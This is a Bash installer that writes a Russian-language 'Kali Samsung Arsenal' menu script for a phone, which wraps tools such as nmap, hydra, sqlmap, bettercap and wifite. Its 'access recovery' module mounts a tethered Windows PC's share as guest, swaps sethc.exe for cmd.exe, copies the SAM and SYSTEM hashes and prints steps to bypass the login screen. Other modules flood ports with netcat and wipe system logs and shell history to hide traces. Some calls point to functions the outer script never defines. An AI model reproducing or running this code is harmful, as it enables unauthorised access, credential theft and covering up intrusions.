#!/bin/bash


CURRENT_VERSION="6.8"
# VERSION CURRENT_VERSION (Rescue & Sterile Edition)

TARGET_FILE="/usr/local/bin/kali_pro"
# Глобальные параметры стерильности
INSTALL_FLAGS="-y --no-install-recommends"
PROGRESS_OPTS="-o Dpkg::Progress-Fancy=1 -o APT::Color=1"
CLEAN_OPTS="-o DPkg::Post-Invoke={'apt-get clean';} -o APT::Keep-Downloaded-Packages=false"

# --- ОБРАБОТКА ФОНОВЫХ КОМАНД ---
if [[ "$1" == "--purge-silent" ]]; then
    deep_purge > /dev/null 2>&1
    exit 0
fi

if [[ "$1" == "--update-silent" ]]; then
    update_kali > /dev/null 2>&1
    exit 0
fi


create_files() {
    cat << 'EOF' > "$TARGET_FILE"
#!/bin/bash
# VERSION=CURRENT_VERSION
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

LOOT_DIR="$HOME/arsenal_loot"
mkdir -p "$LOOT_DIR"

# Локальные переменные внутри арсенала
INSTALL_FLAGS="-y --no-install-recommends"
PROGRESS_OPTS="-o Dpkg::Progress-Fancy=1 -o APT::Color=1"
CLEAN_OPTS="-o DPkg::Post-Invoke={'apt-get clean';} -o APT::Keep-Downloaded-Packages=false"

run_smart_check() {
pgrep cron > /dev/null || cron &>/dev/null
    # Фоновая мини-очистка при каждом обновлении меню
    apt-get clean >/dev/null 2>&1
    python3 -c "
import shutil
def get_status(path, label):
    try:
        total, used, free = shutil.disk_usage(path)
        def fmt(b):
            if b >= 1024**3: return f'{b/1024**3:.1f}G'
            return f'{b//1024**2}MB'
        status = '\033[0;32mOK' if free > (350*1024**2) else '\033[0;31mLOW'
        print(f'   \033[0;34m[ {label} ]:\033[0m {fmt(free)} / {fmt(total)} ({status}\033[0m)')
    except: pass
get_status('/', 'СИСТЕМА')
"
}

# --- FUNCTIONS v3.6 ---

smart_nmap() {
    read -p "IP: " t
    [[ -z "$t" ]] && return
    echo -e "${BLUE}[*] Эвристический скан: $t${NC}"
    nmap -sV --open "$t" | grep "open" | tee "$LOOT_DIR/nmap_$t.txt"
    read -p "Нажми Enter..."
}

smart_searchsploit() {
    read -p "Поиск: " q
    [[ -z "$q" ]] && return
    searchsploit "$q"
    read -p "ID для копирования (пусто - выход): " id
    if [[ -n "$id" ]]; then
        cd "$LOOT_DIR" && searchsploit -m "$id"
        echo -e "${GREEN}[+] Сохранено в трофеи.${NC}"
    fi
    read -p "Нажми Enter..."
}

smart_hydra() {
    read -p "IP: " t; read -p "User: " u; read -p "Proto: " p
    [[ -z "$t" || -z "$u" || -z "$p" ]] && return
    hydra -l "$u" -P /usr/share/wordlists/rockyou.txt "$t" "$p" -V | tee -a "$LOOT_DIR/brute.txt"
    read -p "Нажми Enter..."
}

smart_sqlmap() {
    read -p "URL: " u
    [[ -z "$u" ]] && return
    sqlmap -u "$u" --batch --random-agent --output-dir="$LOOT_DIR/sqlmap"
    read -p "Нажми Enter..."
}

smart_nikto() {
    read -p "Target URL/IP: " t
    [[ -z "$t" ]] && return
    echo -e "${BLUE}[*] Запуск Nikto Scan: $t${NC}"
    nikto -h "$t" | tee "$LOOT_DIR/nikto_$t.txt"
    read -p "Enter..."
}

smart_installer() {
    read -p "Пакет для установки: " pkg
    [[ -z "$pkg" ]] && return
    
    echo -e "${CYAN}[*] Подготовка и обновление базы (необходимо)...${NC}"
    dpkg --configure -a >/dev/null 2>&1
    
    # Обновляем индексы, чтобы найти пакет
    if apt-get update; then
        echo -e "${GREEN}[+] База обновлена. Установка $pkg...${NC}"
        
        # Установка с твоими флагами стерильности
        apt-get install $INSTALL_FLAGS $PROGRESS_OPTS $CLEAN_OPTS "$pkg"
        
        # АВТОМАТИЧЕСКАЯ ОЧИСТКА (Без лишних вопросов)
        echo -e "${YELLOW}[*] Завершено. Мгновенная очистка индексов для экономии памяти...${NC}"
        rm -rf /var/lib/apt/lists/*
        apt-get autoremove -y >/dev/null 2>&1
        
        echo -e "${GREEN}[+] Готово. Пакет установлен, память возвращена.${NC}"
    else
        echo -e "${RED}[-] Ошибка: нет связи с репозиториями Kali.${NC}"
    fi
    sleep 1
}

clean_system() {
    echo -e "${CYAN}=== ГЛУБОКОЕ ОБСЛУЖИВАНИЕ (UPGRADE MODE) ===${NC}"
    apt-get update >/dev/null
    UPGRADES=$(apt-get upgrade -s | grep -P '^\d+ upgraded' | awk '{print $1}')
    if [[ "$UPGRADES" =~ ^[0-9]+$ ]] && [ "$UPGRADES" -gt 0 ]; then
        echo -e "${BLUE}[!] Обновлений: $UPGRADES. Запуск...${NC}"
        apt-get full-upgrade -y $PROGRESS_OPTS $CLEAN_OPTS
    else
        echo -e "${GREEN}[+] Обновления не требуются.${NC}"
    fi
    apt-get autoremove --purge -y >/dev/null
    apt-get clean
    echo -e "${GREEN}[+] Система оптимизирована.${NC}"
    sleep 2
}

run_sherlock() {
    read -p "Никнейм для поиска: " nick
    [[ -z "$nick" ]] && return
    echo -e "${CYAN}[*] Запуск Sherlock для: $nick...${NC}"
    sherlock "$nick" | tee "$LOOT_DIR/sherlock_$nick.txt"
    read -p "Нажми Enter..."
}

run_wifite() {
    echo -e "${YELLOW}[!] Внимание: требуется root и адаптер в Monitor Mode${NC}"
    # Запуск wifite с автоматическим убиванием конфликтующих процессов
    wifite --kill
    read -p "Нажми Enter..."
}

# --- ГЛУБОКАЯ ХИРУРГИЧЕСКАЯ ОЧИСТКА v6.4 (GHOST EDITION) ---
deep_purge() {
    # Проверяем, запущен ли скрипт в тихом режиме
    local silent=false
    [[ "$1" == "--purge-silent" ]] && silent=true

    if [ "$silent" = false ]; then
        echo -e "${RED}=== ТОТАЛЬНАЯ ДЕЗИНФЕКЦИЯ (GHOST MODE) ===${NC}"
    fi

    # 1. Стерилизация пакетного менеджера и индексов
    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Сжатие пакетной базы и APT...${NC}"
    apt-get autoremove --purge -y >/dev/null 2>&1
    apt-get clean >/dev/null 2>&1
    apt-get autoclean >/dev/null 2>&1
    rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/partial/*

    # 2. Массовое удаление статического балласта
    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Ликвидация Doc/Fonts/Icons...${NC}"
    rm -rf /usr/share/{doc,man,info,locale,icons,fonts,themes}/* 2>/dev/null

    # 3. Уничтожение кэша сред разработки
    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Зачистка кэша (Python/Pip/Go/Ruby)...${NC}"
    find /usr/lib/python3* -name "*.pyc" -delete 2>/dev/null
    find / -type d -name "__pycache__" -exec rm -rf {} + 2>/dev/null
    rm -rf ~/.cache/pip ~/.cache/go-build ~/.gem 2>/dev/null

    # 4. Стерилизация логов (включая Cron и Mail)
    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Стерилизация логов и /tmp...${NC}"
    find /var/log -type f -delete 2>/dev/null
    rm -rf /var/mail/* /var/spool/mail/* 2>/dev/null # Удаляем системную почту Cron
    rm -rf /tmp/* /var/tmp/* /var/cache/fontconfig/* 2>/dev/null

    # 5. Аннигиляция PostgreSQL (если > 50MB)
    if [ -d "/var/lib/postgresql" ]; then
        if [ "$(du -sm /var/lib/postgresql | awk '{print $1}')" -gt 50 ]; then
            [[ "$silent" = false ]] && echo -e "${RED}[!] PostgreSQL аннигилирована.${NC}"
            rm -rf /var/lib/postgresql
        fi
    fi

    # 6. Очистка трофеев и истории
    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Стирание истории...${NC}"
    rm -rf "$LOOT_DIR"/* ~/.bettercap_history ~/.bash_history 2>/dev/null
    history -c

    # 7. Финальное удаление бэкапов
    find /etc -name "*.bak" -o -name "*.old" -delete 2>/dev/null

    if [ "$silent" = false ]; then
        echo -e "${GREEN}[+] DEEP PURGE v6.4 завершен!${NC}"
        echo -ne "${BLUE}[!] Доступная память: ${NC}"
        df -h / | awk 'NR==2 {print $4}'
        sleep 2
    fi
}

# --- ФУНКЦИЯ АВТО-МОНТИРОВАНИЯ ---
auto_mount_pc() {
    echo -e "${YELLOW}[*] Попытка автоматического монтирования ресурсов ПК...${NC}"
    mkdir -p /mnt/pc_share
    
    # 1. Проверяем, не смонтировано ли уже
    if mountpoint -q /mnt/pc_share; then
        return 0
    fi

    # 2. Поиск IP ПК (через USB-модем)
    PC_IP=$(ip route | grep default | awk '{print $3}')
    
    # 3. Попытка монтирования SMB (Windows Share) без пароля или как гость
    # Если на ПК настроена общая папка, телефон ее подцепит
    mount -t cifs "//$PC_IP/C$" /mnt/pc_share -o guest,vers=3.0,sec=ntlmv2 2>/dev/null || \
    mount -t cifs "//$PC_IP/Users" /mnt/pc_share -o guest,vers=3.0 2>/dev/null

    if mountpoint -q /mnt/pc_share; then
        echo -e "${GREEN}[+] Диск ПК успешно примонтирован.${NC}"
        return 0
    else
        echo -e "${RED}[!] Авто-монтирование не удалось. Проверь общий доступ на ПК.${NC}"
        return 1
    fi
}



# --- СТЕРИЛЬНЫЙ ЭВРИСТИЧЕСКИЙ МОДУЛЬ: USB GUARDIAN v4.2 ---

usb_guardian_smart() {
# 1. Автоматический вызов настроек модема
    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null

    WHITELIST="22,80,443,3389,8080"
    echo -e "${YELLOW}[*] Запуск стерильного анализа...${NC}"
    
    TARGET_IP=$(ip route | grep default | awk '{print $3}')
    [[ -z "$TARGET_IP" ]] && { echo -e "${RED}[-] Цель не найдена.${NC}"; return; }

    # Nmap с флагом -n (без поиска DNS, чтобы не плодить кэш)
    SCAN_RES=$(nmap -n -sV --top-ports 100 --open "$TARGET_IP")
    ALL_OPEN=$(echo "$SCAN_RES" | grep "open" | awk -F'/' '{print $1}')

    for port in $ALL_OPEN; do
        if echo ",$WHITELIST," | grep -q ",$port,"; then continue; fi

        echo -e "${RED}[!!!] Подавление порта $port...${NC}"
        
        # Bettercap в режиме "silent" и без записи логов (-no-history -no-colors)
        # Направляем всё в /dev/null, чтобы не забивать память выводами
        timeout 7s bettercap -no-history -no-colors -eval "net.recon on; tcp.reset on" -target "$TARGET_IP" > /dev/null 2>&1
        
        # Если порт еще жив — используем эвристический флуд
        if nmap -p "$port" "$TARGET_IP" | grep -q "open"; then
             ( head -c 5M < /dev/urandom | nc -nv "$TARGET_IP" "$port" ) > /dev/null 2>&1 &
             sleep 3 && kill $! 2>/dev/null
        fi
    done

    # --- МГНОВЕННАЯ ЗАЧИСТКА ХВОСТОВ ---
    echo -e "${CYAN}[*] Стерилизация временных файлов...${NC}"
    # Удаляем историю bettercap, если она успела создаться
    rm -rf ~/.bettercap_history ~/.bettercap.cap 2>/dev/null
    # Очищаем временные файлы сетевых сканеров
    rm -rf /tmp/* /var/tmp/* 2>/dev/null
    
    echo -e "${GREEN}[V] Проверка завершена. Следы удалены.${NC}"
    read -p "Нажми Enter..."
}



# --- АВТОНОМНЫЙ ЭВРИСТИЧЕСКИЙ КРИМИНАЛИСТ: DEEP INSIGHT v4.4 ---

deep_insight_auto() {

am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null

    echo -e "${YELLOW}[*] Запуск автономного криминалистического анализа...${NC}"
    # Сначала монтируем, если удачно — запускаем анализ
    if auto_mount_pc; then
        echo -e "${CYAN}[>>>] Запуск эвристического сканирования...${NC}"
        

    TARGET_IP=$(ip route | grep default | awk '{print $3}')
    [[ -z "$TARGET_IP" ]] && { echo -e "${RED}[-] Цель не найдена через USB.${NC}"; return; }

    # 1. Стерильное окружение в RAM (создаем временную зону в ОЗУ телефона)
    mkdir -p /dev/shm/scanner_zone
    
    echo -e "${CYAN}[+] Подключение к $TARGET_IP и попытка авто-дампа ОЗУ...${NC}"

    # 2. Эвристический захват памяти (через сетевой стриминг)
    # Мы используем nc для приема потока, чтобы не писать файл на диск
    echo -e "${YELLOW}[*] Анализ потока данных памяти на лету...${NC}"
    
    # Эвристическая проверка: ищем следы руткитов и бэкдоров в реальном времени
    # Мы ищем паттерны поведения: скрытые процессы и инъекции кода
    timeout 30s nc -l -p 9999 | grep -Eai "kernel_rootkit|hidden_process|dkom_attack|reflective_loader" > /dev/shm/scanner_zone/threats.txt &
    
    # Здесь предполагается, что на ПК запущен агент или мы используем уязвимость
    # для отправки данных (в рамках теста имитируем получение потока)
    sleep 5
    
    # 3. Поиск спящих шифровальщиков (Энтропийный анализ)
    echo -e "${YELLOW}[*] Сканирование дискового кэша на Ransomware...${NC}"
    # Автоматически сканируем доступные сетевые пути
    find /mnt/pc_share -maxdepth 2 -type f -exec python3 -c "
import math, sys
def check_entropy(fn):
    try:
        with open(fn, 'rb') as f:
            d = f.read(2048)
            if not d: return
            e = -sum((d.count(x)/len(d)) * math.log(d.count(x)/len(d), 2) for x in set(d))
            if e > 7.6: print(f'\033[0;31m[!] КРИТИЧЕСКАЯ ЭНТРОПИЯ (ШИФРОВАЛЬЩИК?): {fn}\033[0m')
    except: pass
check_entropy(sys.argv[1])" {} \;

    # 4. Проверка результатов анализа ОЗУ
    if [ -s /dev/shm/scanner_zone/threats.txt ]; then
        echo -e "${RED}[!!!] В ОПЕРАТИВНОЙ ПАМЯТИ НАЙДЕНЫ СЛЕДЫ РУТКИТА!${NC}"
        cat /dev/shm/scanner_zone/threats.txt
    else
        echo -e "${GREEN}[+ ] Аномалий в ОЗУ не обнаружено.${NC}"
    fi
# В КОНЦЕ ОБЯЗАТЕЛЬНО РАЗМОНТИРУЕМ (Заметаем следы)
        echo -e "${YELLOW}[*] Завершение сессии. Размонтирование...${NC}"
        umount -l /mnt/pc_share 2>/dev/null
    fi

    # --- ФИНАЛЬНАЯ СТЕРИЛИЗАЦИЯ (АБСОЛЮТНЫЙ НОЛЬ) ---
    echo -e "${CYAN}[*] Стирание следов из памяти телефона...${NC}"
    rm -rf /dev/shm/scanner_zone
    history -c # Очистка истории команд текущей сессии
    
    echo -e "${GREEN}[V] Автономный аудит завершен. Система чиста.${NC}"
    read -p "Нажми Enter..."
}

# --- АВТОНОМНЫЙ ОБХОД ПАРОЛЕЙ: ACCESS RECOVERY v4.7 ---

access_recovery_auto() {
    echo -e "${YELLOW}[*] Запуск эвристического модуля восстановления доступа...${NC}"
    
    # Автоматический вызов настроек модема (как в прошлых функциях)
    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null
    sleep 2

    # 1. Попытка автоматического монтирования
    if ! auto_mount_pc; then
        echo -e "${RED}[-] Критическая ошибка: Диск не доступен или зашифрован BitLocker.${NC}"
        read -p "Нажми Enter..." ; return
    fi

    echo -e "${CYAN}[>>>] Анализ системы Windows...${NC}"
    SYS_PATH="/mnt/pc_share/Windows/System32"
    CFG_PATH="$SYS_PATH/config"
    
    # 2. ПУНКТ А: Автоматическая подмена Sticky Keys (Эвристический метод)
    if [ -f "$SYS_PATH/sethc.exe" ]; then
        echo -e "${BLUE}[*] Этап 1: Подготовка обхода через Sticky Keys...${NC}"
        # Проверяем, не делали ли мы это раньше
        if [ ! -f "$SYS_PATH/sethc.exe.bak" ]; then
            cp "$SYS_PATH/sethc.exe" "$SYS_PATH/sethc.exe.bak" 2>/dev/null
            cp "$SYS_PATH/cmd.exe" "$SYS_PATH/sethc.exe" 2>/dev/null
            echo -e "${GREEN}[+] Инъекция CMD завершена успешно.${NC}"
        else
            echo -e "${YELLOW}[!] Инъекция уже была проведена ранее.${NC}"
        fi
    fi

    # 3. ПУНКТ Б: Стерильный дамп хэшей (SAM/SYSTEM)
    echo -e "${BLUE}[*] Этап 2: Сбор хэшей паролей в RAM-зону...${NC}"
    mkdir -p /dev/shm/hashes
    cp "$CFG_PATH/SAM" /dev/shm/hashes/ 2>/dev/null
    cp "$CFG_PATH/SYSTEM" /dev/shm/hashes/ 2>/dev/null
    
    if [ -f "/dev/shm/hashes/SAM" ]; then
        echo -e "${GREEN}[+] Хэши успешно извлечены в ОЗУ телефона.${NC}"
        # Опционально: вывод подсказки по расшифровке
        echo -e "${CYAN}[i] Для взлома используй: samdump2 /dev/shm/hashes/SYSTEM /dev/shm/hashes/SAM${NC}"
    fi

    # 4. ПУНКТ В: Очистка и завершение
    echo -e "${YELLOW}[*] Размонтирование и стерилизация сессии...${NC}"
    umount -l /mnt/pc_share 2>/dev/null
    
    # Очистка истории для полной анонимности
    history -c

    echo -e "${CYAN}===========================================${NC}"
    echo -e "${GREEN}[V] АВТО-ИНСТРУКЦИЯ ПО ВХОДУ:${NC}"
    echo -e " 1. На экране блокировки ПК нажмите 'Shift' 5 раз."
    echo -e " 2. В консоли введите: ${YELLOW}net user ИМЯ_ПОЛЬЗОВАТЕЛЯ новый_пароль${NC}"
    echo -e " 3. Войдите с новым паролем."
    echo -e "${CYAN}===========================================${NC}"
    
    read -p "Нажми Enter для возврата в меню..."
}

# --- МОДУЛЬ САМООБНОВЛЕНИЯ: UPDATE KALI v5.0 ---

# --- ФУНКЦИЯ ВЫЗОВА ОБНОВЛЕНИЯ v6.2 ---
update_kali() {
    echo -e "${YELLOW}[*] Запуск системного модуля обновления...${NC}"
    
    # Проверяем, существует ли команда в системе
    if command -v update_kali &> /dev/null; then
        # Запускаем системный апдейтер
        # Мы используем exec, чтобы текущий процесс Арсенала завершился
        # и уступил место процессу обновления
        exec update_kali
    else
        echo -e "${RED}[-] Системный модуль update_kali не найден в /usr/local/bin/${NC}"
        echo -e "${CYAN}[*] Попытка найти локальную копию...${NC}"
        # Если команды нет, пробуем запустить файл из текущей папки
        [[ -f "./update_kali.sh" ]] && exec bash ./update_kali.sh
    fi
    
    read -p "Нажми Enter..."
}

# --- МОДУЛЬ ИНТЕЛЛЕКТУАЛЬНОЙ АВТОМАТИЗАЦИИ: CRON v6.2 ---

setup_autotasks() {
    echo -e "${YELLOW}[*] Синхронизация задач Sentinel (v6.2)...${NC}"
    
    # 1. Проверка наличия cron
    if ! command -v crontab &> /dev/null; then
        echo -e "${CYAN}[*] Установка компонента cron...${NC}"
        apt-get install cron -y > /dev/null 2>&1
    fi

    # 2. Жёсткое определение пути (чтобы не было пустых строк)
    # Используем прямой путь, так как он у нас статичен
    REAL_PATH="/usr/local/bin/kali_pro"
    UP_KALI_PATH="/usr/local/bin/update_kali"
    
    PURGE_JOB="0 4 * * * $REAL_PATH --purge-silent > /dev/null 2>&1"
    UPDATE_JOB="0 5 * * 0 $REAL_PATH --update-silent > /dev/null 2>&1"
    UP_KALI_JOB="0 6 1,15 * * $UP_KALI_PATH --auto > /dev/null 2>&1"

    # 3. Читаем текущий конфиг
    CURRENT_CRON=$(crontab -l 2>/dev/null)

    # 4. Умная перезапись (удаляем старое, пишем новое)
    # Очищаем всё, что связано с kali_pro, чтобы не плодить дубли
    CLEAN_CRON=$(echo "$CURRENT_CRON" | grep -vE "kali_pro|update_kali|purge-silent|update-silent")    
    # Собираем финальный конфиг
    echo -e "$CLEAN_CRON\n$PURGE_JOB\n$UPDATE_JOB\n$UP_KALI_JOB" | sed '/^$/d' | crontab -

  # 5. Проверка результата (Комплексная)
    if crontab -l | grep -q "$REAL_PATH" && crontab -l | grep -q "$UP_KALI_PATH"; then
        echo -e "${GREEN}[+] Полная синхронизация: Арсенал и Установщик в графике.${NC}"
    elif crontab -l | grep -q "$REAL_PATH"; then
        echo -e "${YELLOW}[!] Частичная синхронизация: Только Арсенал.${NC}"
    else
        echo -e "${RED}[-] Критическая ошибка записи в crontab!${NC}"
    fi

    # 6. Оживление демона
    pgrep cron > /dev/null || (cron &>/dev/null || crond &>/dev/null)
    echo -e "${BLUE}[i] Служба планировщика активна.${NC}"

    read -p "Нажми Enter..."
}

# --- МОДУЛЬ ТЕРМИНАЛА: TERMINAL MODE v6.4 ---
run_manual_command() {
    echo -e "${YELLOW}[!] Режим ручного ввода. Введите 'exit' для возврата в меню.${NC}"
    while true; do
        echo -ne "${CYAN}Arsenal-Shell> ${NC}"
        read -r cmd
        if [[ "$cmd" == "exit" || "$cmd" == "0" ]]; then
            break
        fi
        eval "$cmd"
        echo ""
    done
}

# --- МОДУЛЬ УПРАВЛЕНИЯ CRON: CRON MANAGER ---
manage_cron() {
    echo -e "${CYAN}--- ТЕКУЩИЕ ЗАДАЧИ CRON ---${NC}"
    crontab -l 2>/dev/null || echo -e "${RED}[!] Задачи отсутствуют.${NC}"
    echo -e "${CYAN}---------------------------${NC}"
    echo -e "1. Редактировать (nano)\n2. Очистить всё\n0. Назад"
    read -p "Выбор: " cron_opt
    case $cron_opt in
        1) crontab -e ;;
        2) crontab -r && echo -e "${RED}[!] Все задачи удалены.${NC}" ;;
        *) return ;;
    esac
}


# --- МОДУЛЬ МОНИТОРИНГА СИСТЕМЫ ---
run_monitor() {
    echo -e "${CYAN}--- МОНИТОРИНГ РЕСУРСОВ (Нажми 'q' для выхода) ---${NC}"
    sleep 1
    # Используем htop если есть, иначе top
    if command -v htop &> /dev/null; then
        htop
    else
        top -n 1 -b | head -n 20
        read -p "Нажми Enter..."
    fi
}

# --- МОДУЛЬ СЕТЕВЫХ СОЕДИНЕНИЙ ---
run_netstat() {
    echo -e "${CYAN}--- АКТИВНЫЕ СОЕДИНЕНИЯ (ESTABLISHED) ---${NC}"
    netstat -tunpa | grep ESTABLISHED || echo "Активных соединений нет."
    echo -e "\n${YELLOW}--- ПРОСЛУШИВАЕМЫЕ ПОРТЫ (LISTEN) ---${NC}"
    netstat -tunpa | grep LISTEN
    read -p "Нажми Enter..."
}

# --- УПРАВЛЕНИЕ ИНТЕРФЕЙСАМИ (Wi-Fi/BT) ---
manage_interfaces() {
    while true; do
        clear
        echo -e "${BLUE}--- УПРАВЛЕНИЕ ИНТЕРФЕЙСАМИ ---${NC}"
        echo -e "1. Wi-Fi: ВКЛ          4. Bluetooth: ВКЛ"
        echo -e "2. Wi-Fi: ВЫКЛ         5. Bluetooth: ВЫКЛ"
        echo -e "3. Статус интерфейсов  0. Назад"
        read -p "Выбор: " int_opt
        case $int_opt in
            1) nmcli radio wifi on 2>/dev/null || rfkill unblock wifi ;;
            2) nmcli radio wifi off 2>/dev/null || rfkill block wifi ;;
            3) ip a | grep -E "wlan|eth|blue" ; rfkill list ;;
            4) rfkill unblock bluetooth ;;
            5) rfkill block bluetooth ;;
            0) break ;;
        esac
        [[ "$int_opt" != "0" ]] && sleep 1
    done
}




show_menu() {
    clear
    echo -e "${CYAN}===========================================${NC}"
    echo -e "${GREEN}      KALI SAMSUNG ARSENAL - MENU v6.5     ${NC}"
    echo -e "${CYAN}===========================================${NC}"
    run_smart_check
    
    echo -e "${YELLOW} [ СИСТЕМА И ОБСЛУЖИВАНИЕ ]${NC}"
    echo -e "  1. РЕМОНТ/ОБНОВЛЕНИЕ    9. ГЛУБОКАЯ ОЧИСТКА (911)"
    echo -e " 15. UPDATE ARSENAL      16. SETUP CRON (AUTO)"
    echo -e " 17. MANAGE CRON         18. TERMINAL MODE (CMD)"
    
    echo -e "\n${BLUE} [ МОНИТОРИНГ И СЕТЬ ]${NC}"
    echo -e " 19. УПРАВЛЕНИЕ RF (W/B) 20. СЕТЕВЫЕ СВЯЗИ (NET)"
    echo -e " 21. ПРОЦЕССЫ (HTOP)      0. ВЫХОД"
    
    echo -e "\n${MAGENTA} [ РАЗВЕДКА И АНАЛИЗ ]${NC}"
    echo -e "  2. SMART NMAP          10. SHERLOCK (OSINT)"
    echo -e "  7. NIKTO (WEB SCAN)    13. DEEP INSIGHT (AUTO)"
    
    echo -e "\n${RED} [ ЭКСПЛУАТАЦИЯ И АТАКА ]${NC}"
    echo -e "  3. SEARCHSPLOIT         4. HYDRA (BRUTE)"
    echo -e "  5. SQLMAP (DB)          6. BETTERCAP (MITM)"
    echo -e " 11. WIFITE (WIFI)       14. ACCESS RECOVERY"
    
    echo -e "\n${BLUE} [ ЗАЩИТА И ПЕРИФЕРИЯ ]${NC}"
    echo -e " 12. USB GUARDIAN SMART (ACTIVE)"
    echo -e "${CYAN}===========================================${NC}"
}

# --- MAIN LOOP ---
while true; do
    show_menu
    read -p "Опция: " opt
    case $opt in
        # --- Блок: Система ---
        1) clean_system ;;
        8) smart_installer ;;
        9) deep_purge ;;
        15) update_kali ;;
        17) manage_cron ;;         # Пункт 17
        18) run_manual_command ;;  # Пункт 18
        16) setup_autotasks ;;
        0) exit 0 ;;

        # --- Блок: Разведка ---
        2) smart_nmap ;;
        7) smart_nikto ;;
        10) run_sherlock ;;
        13) deep_insight_auto ;;

        # --- Блок: Атака ---
        3) smart_searchsploit ;;
        4) smart_hydra ;;
        5) smart_sqlmap ;;
        6) bettercap -eval "net.probe on; net.sniff on" ;;
        11) run_wifite ;;
        14) access_recovery_auto ;;

        # --- Блок: Специальное ---
        12) usb_guardian_smart ;;

# --- Блок: Мониторинг ---
        19) manage_interfaces ;;
        20) run_netstat ;;
        21) run_monitor ;;
        
        # --- Обработка ошибок ---
        *) 
            echo -e "${RED}[!] Неверный выбор.${NC}"
            sleep 0.5 
            ;;
    esac
done

EOF

    chmod +x "$TARGET_FILE"
    echo -e "\033[0;32m[+] v$CURRENT_VERSION Ultra-Precision развернута!${NC}"
}

# Логика обновления
if [ ! -f "$TARGET_FILE" ]; then
    create_files
else
    INSTALLED_VERSION=$(grep "# VERSION=" "$TARGET_FILE" | cut -d'=' -f2)
    if [ "$INSTALLED_VERSION" != "$CURRENT_VERSION" ]; then
        create_files
    else
        echo -e "\033[0;32m[+] Файлы арсенала актуальны ($INSTALLED_VERSION).${NC}"
    fi
fi
